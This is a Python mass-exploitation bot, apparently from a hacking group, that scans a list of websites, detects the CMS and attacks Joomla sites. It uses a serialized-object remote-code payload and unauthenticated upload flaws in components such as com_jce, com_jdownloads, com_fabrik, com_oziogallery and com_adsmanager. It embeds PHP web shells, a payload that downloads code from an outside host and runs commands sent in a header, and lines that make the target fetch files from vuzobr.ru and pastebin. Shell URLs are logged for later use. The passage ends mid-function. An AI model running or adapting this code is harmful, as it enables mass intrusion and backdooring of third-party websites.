#!/usr/bin/python
#0day Private Bot
#Coded By Viper1337 
#Russian

import requests, re,urllib, urllib2, os, sys, codecs,binascii, json, argparse					
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time
from random import sample as rand
from Queue import Queue				   		
from platform import system
from urlparse import urlparse
from optparse import OptionParser	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)
										
															
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 
try:
    dork = raw_input("Write site list name \n")
    with codecs.open(dork, mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
		banner = """{}{} \n \n
  ______                      _       _     ____            _      __      __  __   _  _   
 |___  /                     | |     (_)   |  _ \          | |     \ \    / / /_ | | || |  
    / /    ___    _ __ ___   | |__    _    | |_) |   ___   | |_     \ \  / /   | | | || |_ 
   / /    / _ \  | '_ ` _ \  | '_ \  | |   |  _ <   / _ \  | __|     \ \/ /    | | |__   _|
  / /__  | (_) | | | | | | | | |_) | | |   | |_) | | (_) | | |_       \  /     | |    | |  
 /_____|  \___/  |_| |_| |_| |_.__/  |_|   |____/   \___/   \__|       \/      |_|    |_|  
                                                                                                                                   
	ICQ: @viper1337official
									    
		\n""".format(fc, sb)
		
		print banner
 
shell = """GIF89a <?php echo 'Viper1337'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" Joomla="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
shell_2 = """<?php if(isset($_GET["bang"])){echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]";echo"<br><font color=#FFFFFF>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}?>
<title>Bigbang Bot v1</title><center><div id=q>Bigbang Bot<br><font color="#009900" size="3"><pre><img border="0" src="style.jpg" width="0" height="0"></pre><style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}"""

filename = "xx.jpg"

zat = "root.php.xxxjpg"

shell_name = str(time.time())[:-3]

sano = "bigs.PhP.txt"

path = str(time.time())[:-3]

filenamex = "RxR_"+str(shell_name)+".php.php"

filenamexy = str(shell_name)+".php"

filevid = "izo.PhP.txtx"

kcfile = "tool/priv.php.jd"

jceupshell = "ups/root.php"

jjshell = "ups/root.php3.g"

izshell = 'shell.jpg'

xjceupshell = "ups/root.php"

zino = "ups/root.php"


xccc = "ups/root.PhP.txt"

xcccc = "ups/root.phP"


zabic = "xxt.php"

listpass = 'password.txt'
listuser = 'user.txt'
filte = "tool/ddd.php"

EMail = 'sercany9293@gmail.com'

cfile = "tool/priv.php"


fck = "tool/izocin.txt"

payloadz = "foo=<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/izoking/2/master/u.php -O izo.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"


filecl = "izo.php"

com_jdownloads = 'tool/bot.php3.g'
com_jdownloads_index = 'hhh.gif'
com_jdownloadszip_index = 'tool/drshap7.zip'

Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/root.php','w+'),file_get_contents('http://vuzobr.ru/modules/mod_allnews/tmpl/info.txt')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("http://pastebin.com/raw/Q1aM9w16"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.html','w+'),' security woow ');"""
headersx = {'action':'woof_upload_ext','abspath':'data:,<?php system("curl http://vuzobr.ru/modules/mod_allnews/tmpl/info.txt -o root.php"); ?>'}

def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
	
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass
def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass
def rce_url(url, user_agent):
	
	try:
		headers = {
		'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', 
		'x-forwarded-for': user_agent  
		}
		cookies = requests.get(url,headers=headers).cookies
		for _ in range(3):
			response = requests.get(url, headers=headers,cookies=cookies)    
		return response
		
	except:
		pass
 
def php_str_noquotes(data):
	try:
	
		"Convert string to chr(xx).chr(xx) for use in php"
		encoded = ""
		for char in data:
			encoded += "chr({0}).".format(ord(char))
	  
		return encoded[:-1]
		
	except:
		pass
def generatex_payload(php_payload):
	
	try:
	
		php_payload = "eval({0})".format(php_str_noquotes(php_payload))
	  
		terminate = '\xf0\xfd\xfd\xfd';
		exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
		injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
		exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
		exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
	  
		return exploit_template
		
	except:
		pass		
def generate(payload):
    php_payload = "eval({0})".format(toCharCode(payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
    return exploit_template
	
def sitebul(url):
	
	
    try:	
		
		
		
		CheckCMS = requests.get(url + '/language/en-GB/en-GB.xml')
		Checktwo = requests.get(url, timeout=5)
		Checktree = requests.get(url + '/application/configs/application.ini')
		Checkfour = requests.get(url + '/README.txt')
		CheckOsc = requests.get(url + '/admin/images/cal_date_over.gif')
		CheckOsc2 = requests.get(url + '/admin/login.php')
		
		if 'com_content' in Checktwo.text.encode('utf-8') or 'Joomla' in CheckCMS.text.encode('utf-8'):
			ExploitS(url)
			
		elif '/wp-content/' in Checktwo.text.encode('utf-8'):
			  wpsbot(url)
			  
		elif 'prestashop' in Checktwo.text.encode('utf-8'):
			  presbot(url)

		elif 'baseUrl' in Checktwo.text.encode('utf-8'):
			  drurce(url)
			  
		elif '/node/' in Checkfour.text.encode('utf-8'):
			  drurce(url)
			  
		elif '/sites/default/' in Checktwo.text.encode('utf-8'):
			  drurce(url)

		elif 'GIF89a' in CheckOsc.text.encode('utf-8') or 'osCommerce' in CheckOsc2.text.encode('utf-8'):
			  osrce(url)
		
		elif 'APPLICATION_PATH' in Checktree.text.encode('utf-8'):
			  zenbot(url) 					
		else:
			 unkbot(url)
                 			
			
    except:
        pass			
	

def ExploitS(url):
	
	
    try:
		
		

		filenames = 'RxR' + '__' + rand_str (5) + '.php'

		# 2 . Reflex Gallery
		
		global payload
		payload_generated = generate(payload)
		prepare(url, payload_generated)

		
		aaReflexlib = requests.get(url+'/root.php?shell')
		
		
		if 'Bigbang' in aaReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} Joomla RCE     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
                        xshell_path = re.findall("uname(.*?)/uname",aaReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/joomlashell.txt', 'a').write(url+'/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} Joomla RCE     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		pl = generatex_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/root.php','w+'),file_get_contents('http://vuzobr.ru/modules/mod_allnews/tmpl/info.txt'));")
			
		rce_url(url,pl)
			
		req_rce = requests.get(url+'/root.php?shell')
			
		if 'Bigbang' in req_rce.content:	
			print '{}[Joomla]: {} {}    ====> {}{} rce 2   {}{} eXploiting Done  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",req_rce.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/root.php'+'\n')
			sys.exit()		
		else:			
			print '{}[Joomla]: {} {}   ====> {}{}  rce 2 {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		
		# 1 .   Gravity Forms
		
		
		fgappgravkg  = {'upload-dir': '../../', 
		'upload-overwrite': '0', 
		'action': 'upload'}
		
		
		fgGravkg = {'Filedata': open(jceupshell, 'rb')}
		
		Gravkgreq = requests.post(url+'/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"', data=fgappgravkg, files=fgGravkg)
	
		
		fgGravkglib = requests.get(url+'/root.php?shell')
		
		
		if 'Bigbang' in fgGravkglib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jce     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",fgGravkglib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jce     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 1 .   Gravity Forms
		
		
		
		
		PrivMethod = {'json': "{\"fn\":\"folderRename\",\"args\":[\"/" + izshell + "\",\"./vulns.php\"]}"}

		
		iz = requests.post(url+'/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw', data=PrivMethod, timeout=5)
		
		VulnCheck = requests.get(url+'/vulns.php')
		
		
		if 'izocin' in VulnCheck.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jce Priv8    {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/vulns.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jce Priv8    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)




		# 1 .   Gravity Forms
		
		
		zttappgravkg  = {'name':'izocin', 
		'mail':'sercany9293@gmail.com', 
		'catlist':'1',
		'filetitle':"lolz",
		'description':"<p>zot</p>",
		'2d1a8f3bd0b5cf542e9312d74fc9766f':1,
		'send':1,
		'senden':"Send file",
		'description':"<p>qsdqsdqsdqsdqsdqsdqsd</p>",
		'option':"com_jdownloads", 
		'view':"upload"}
		
		
		zttGravkg = {'pic_upload':(com_jdownloads, open(com_jdownloads, 'rb'), 'multipart/form-data')}
		
		zttGravkgreq = requests.post(url+'/index.php?option=com_jdownloads&Itemid=0&view=upload', data=zttappgravkg, files=zttGravkg)
	
		
		zttGravkglib = requests.get(url+'/images/jdownloads/screenshots/'+com_jdownloads)
		
		
		if 'izocin' in zttGravkglib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jdownloads     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/'+com_jdownloads+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jdownloads     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			



		# 1 .   Gravity Forms
		
		
		zttappgravkg  = {'name':'izocin', 
		'mail':'sercany9293@gmail.com', 
		'catlist':'1',
		'filetitle':"lolz",
		'description':"<p>zot</p>",
		'2d1a8f3bd0b5cf542e9312d74fc9766f':1,
		'send':1,
		'senden':"Send file",
		'description':"<p>qsdqsdqsdqsdqsdqsdqsd</p>",
		'option':"com_jdownloads", 
		'view':"upload"}
		
		
		zttGravkg = {'pic_upload':open(jjshell, 'rb')}
		
		zttGravkgreq = requests.post(url+'/index.php?option=com_jdownloads&Itemid=0&view=upload', data=zttappgravkg, files=zttGravkg)
	
		
		zttGravkglib = requests.get(url+'/images/jdownloads/screenshots/bot.php3.g')
		
		
		if 'izocin' in zttGravkglib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jdownloads bypass     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/bot.php3.g'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jdownloads bypass     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		filename1 = "rxrking.php3.g"
			
			
		com_jd_up = { 'file_upload':(filename1, shell_2, 'text/html'), 'pic_upload':(filename1, shell_2, 'text/html')}

		com_jd_dat = { 'name': 'yc-waif', 'mail': 'sercany9293@gmail.com', 'catlist': '1', 'filetitle': "lolz",
					 'description': "<p>zot</p>" , '2d1a8f3bd0b5cf542e9312d74fc9766f': 1, 'send': 1, 'senden': "Send file",
					 'description': "<p>newsking</p>", 'option': "com_jdownloads", 'view': "upload" }
			
			
		req_jd = requests.post(url+'/index.php?option=com_jdownloads&Itemid=0&view=upload', data=com_jd_dat, files=com_jd_up)
			
			
		shell_jd = requests.get(url+'/images/jdownloads/screenshots/rxrking.php3.g?rxr')
		
		if 'RxR HaCkEr_Ye' in shell_jd.content:
				
			print '{}[Joomla]: {} {}    ====> {}{} com_jdownloads 3  {}{} eXploiting Done  '.format(sb, sd, url, fc,fc, sb,fg)
			open('shells.txt', 'a').write(url+'/images/jdownloads/screenshots/rxrking.php3.g?rxr'+'\n')
			sys.exit()	
		else:
			print '{}[Joomla]: {} {}   ====> {}{}  com_jdownloads 3  {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)



			
		# 1 .   Gravity Forms
		
		
		appgravkg  = {"name" : "me.php", 
		"drop_data" : "1", 
		"overwrite" : "1",
		"field_delimiter" : ",",
		"text_delimiter" : "&quot;",
		"option" : "com_fabrik",
		"controller" :"import",
		"view" : "import",
		"task" : "doimport",
		"Itemid" : "0", 
		"tableid" : "0"}
		
		
		
		
		nGravreq = requests.post(url+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1', data=appgravkg, files={'userfile':open(jceupshell, 'rb')})
		nxxGravreq = requests.post(url+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1', data=appgravkg, files={'userfile':open(xccc, 'rb')})
		nxxxGravreq = requests.post(url+'/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1', data=appgravkg, files={'userfile':open(xcccc, 'rb')})
		
		
		nGravlib = requests.get(url+'/media/root.php?shell')
		nxxGravlib = requests.get(url+'/media/root.PhP.txt?shell')
		nxxxGravlib = requests.get(url+'/media/rooot.phP?shell')
		
		
		if 'Bigbang' in nGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_fabrik old     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",nGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/media/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/media/root.php'+'\n')
			sys.exit()
		elif 'Bigbang' in nxxGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_fabrik old     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",nxxGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/media/root.PhP.txt?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/media/root.PhP.txt'+'\n')
			sys.exit()
		if 'Bigbang' in nxxxGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_fabrik old     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",nxxxGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/media/rooot.phP?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/media/rooot.phP'+'\n')
			sys.exit()			
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_fabrik old     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	

			

			
		# 2 . Reflex Gallery
		
		aaReflexup = {'file' : open(jceupshell, 'rb')}
		
		aaReflexreq = requests.post(url+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/root.php?shell')
		
		
		if 'Bigbang' in aaReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_fabrik new     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",aaReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/root.php?shell'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_fabrik new     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	


		# 15 . com_oziogallery
		
		xxcvbappgrav  = {'path':'/../../../'}
		
		
		xxcvbGrav = {'raw_data':(zino, shell_2, 'text/html')}			
		
		
		xaynzfeReflexreq = requests.post(url+'/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php', data=xxcvbappgrav, files=xxcvbGrav)
		
		xaynzfeReflexlib = requests.get(url+'/root.php?bang')
		
		
		if 'Bigbang' in xaynzfeReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_oziogallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",xaynzfeReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_oziogallery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			 

		# 15 . com_oziogallery
		
		axxcvbappgrav  = {'path':'/../../../'}
		
		
		axxcvbGrav = {'raw_data':(zino, shell_2, 'text/html')}			
		
		
		axaynzfeReflexreq = requests.post(url+'/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php', files=axxcvbGrav, data=axxcvbappgrav)
		
		axaynzfeReflexlib = requests.get(url+'/root.php')
		
		
		if 'Bigbang' in axaynzfeReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_oziogallery2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",axaynzfeReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_oziogallery2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			

		# 15 . com_oziogallery
		
		alex  = {'path':'/../../../'}
		
		
		hagi = {'raw_data':open (xjceupshell, 'rb')}			
		
		
		xaxaynzfeReflexreq = requests.post(url+'/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php',data=alex, files=hagi)
		
		xaxaynzfeReflexlib = requests.get(url+'/root.php?bang')
		
		
		if 'Bigbang' in xaxaynzfeReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_oziogallery bypass     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",xaxaynzfeReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_oziogallery bypass     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


	
		# 3 . Reflex Gallery
		
		aReflexup = {'files[]' : open(jceupshell, 'rb')}
		
		aReflexreq = requests.post(url+'/components/com_jbcatalog/libraries/jsupload/server/php/', files=aReflexup)
		
		aReflexlib = requests.get(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/root.php?bang')
		
		
		if 'Bigbang' in aReflexlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jbcatalog     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",aReflexlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_jbcatalog     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
			
		# 4 . Reflex Gallery
		
		image_myblog = "root.php"
				
		com_myb = {'uploadfile':(image_myblog, shell_2)}
				
		req_myblog = requests.post(url+'/modules/mod_socialpinboard_menu/saveimagefromupload.php', files=com_myb)
				
		token = re.findall('(.*?).php', req_myblog.text)

		lib = requests.get(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/'+token[0]+'.php?bang')
				
				
		if 'Bigbang' in lib.content:
			print '{}[Joomla]: {} {}   ====> {}{}  socialpinboard   {}{} Shell Upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",lib.content)
			tokens = xshell_path[0]
			Check = tokens.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/'+token[0]+'.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/'+token[0]+'.php?bang'+'\n')
			sys.exit()
					
		else:
			print '{}[Joomla]: {} {}   ====> {}{}  socialpinboard  {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
	
		
		# 5 .   Gravity Forms
		
		
		appgrav  = {'name':'root.php'}
		
		
		Grav = {'file':(filename, shell_2, 'text/html')}
		
		Gravreq = requests.post(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component', data=appgrav, files=Grav)
		
		Gravlib = requests.get(url+'/tmp/plupload/root.php?bang')
		
		
		if 'Bigbang' in Gravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_adsmanager     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/tmp/plupload/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/tmp/plupload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_adsmanager     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		
		# 5 .   Gravity Forms
		
		
		
		
		Gravreq = requests.post(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component', data={'name':'root.php'}, files={'file':(izshell, shell_2, 'text/html')})
		xxGravreq = requests.post(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component', data={'name':'root.phP'}, files={'file':(izshell, shell_2, 'text/html')})
		xxxGravreq = requests.post(url+'/index.php?option=com_adsmanager&task=upload&tmpl=component', data={'name':'root.phtml'}, files={'file':(izshell, shell_2, 'text/html')})
		
		
		Gravlib = requests.get(url+'/tmp/plupload/root.php?bang')
		xxGravlib = requests.get(url+'/tmp/plupload/root.phP?bang')
		xxxGravlib = requests.get(url+'/tmp/plupload/root.phtml?bang')
		
		
		if 'Bigbang' in Gravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_adsmanager2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/tmp/plupload/root.php?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/tmp/plupload/root.php'+'\n')
			sys.exit()
		elif 'Bigbang' in xxGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_adsmanager2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",xxGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/tmp/plupload/root.phP?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/tmp/plupload/root.phP'+'\n')
			sys.exit()
		elif 'Bigbang' in xxxGravlib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_adsmanager2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",xxxGravlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/tmp/plupload/root.phtml?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/tmp/plupload/root.phtml'+'\n')
			sys.exit()			
		else:
			print '[{}Joomla]: {} {}	       ====> {}{} com_adsmanager2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			
		
		# 6 .   Gravity Forms
		
		
		
		
		Gravkreq = requests.post(url+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=/../../root.php', data=shell_2)
		
		Gravklib = requests.get(url+'/components/com_b2jcontact/root.php?bang')
		
		
		if 'Bigbang' in Gravklib.content:
			print '[{}Joomla]: {} {}	       ====> {}{} com_b2jcontact     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravklib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/joomlashell.txt', 'a').write(url+'/components/com_b2jcontact/root.php?bang'+'\n'+Check1+'\n\n')
